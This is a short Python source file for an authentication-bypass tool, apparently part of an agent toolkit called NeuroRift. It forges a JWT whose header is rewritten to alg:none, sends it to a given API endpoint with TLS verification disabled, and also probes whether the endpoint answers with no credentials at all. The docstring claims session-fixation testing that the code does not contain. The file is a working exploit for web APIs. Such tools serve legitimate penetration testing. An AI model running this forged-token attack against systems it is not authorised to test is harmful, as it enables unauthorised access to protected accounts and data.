#!/usr/bin/env python3
"""NeuroRift tool: Auth bypass testing (JWT manipulation, session fixation)."""

import base64
import json
import requests
from tools import ToolResult

SCHEMA = {
    "type": "object",
    "required": ["target"],
    "properties": {
        "target": {
            "type": "string",
            "description": "API endpoint requiring authentication",
        },
        "jwt_token": {
            "type": "string",
            "description": "JWT token to manipulate",
            "default": "",
        },
    },
}


def _make_alg_none_jwt(jwt: str) -> str:
    """Forge a JWT with alg:none to bypass signature verification."""
    try:
        parts = jwt.split(".")
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        header["alg"] = "none"
        enc = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
        return f"{enc.decode()}.{parts[1]}."
    except Exception:
        return jwt


class AuthBypassTool:
    name = "auth_bypass"
    description = "Test for authentication bypass via JWT alg:none and session fixation"

    @staticmethod
    def schema():
        return SCHEMA

    def run(self, target: str, jwt_token: str = "") -> ToolResult:
        findings = []

        # Test without any auth
        try:
            resp_unauth = requests.get(target, timeout=10, verify=False)
            if resp_unauth.status_code == 200:
                findings.append(
                    {
                        "type": "auth_bypass",
                        "severity": "CRITICAL",
                        "method": "unauthenticated_access",
                        "detail": "Endpoint returned 200 without any credentials",
                    }
                )
        except requests.RequestException:
            pass

        # JWT alg:none bypass
        if jwt_token:
            forged = _make_alg_none_jwt(jwt_token)
            try:
                resp = requests.get(
                    target,
                    headers={"Authorization": f"Bearer {forged}"},
                    timeout=10,
                    verify=False,
                )
                if resp.status_code == 200:
                    findings.append(
                        {
                            "type": "auth_bypass",
                            "severity": "CRITICAL",
                            "method": "jwt_alg_none",
                            "detail": "Server accepted JWT with alg:none",
                        }
                    )
            except requests.RequestException:
                pass

        return ToolResult(
            tool_name=self.name,
            target=target,
            success=True,
            findings=findings,
            raw_output=f"Tested unauthenticated access + JWT alg:none",
        )
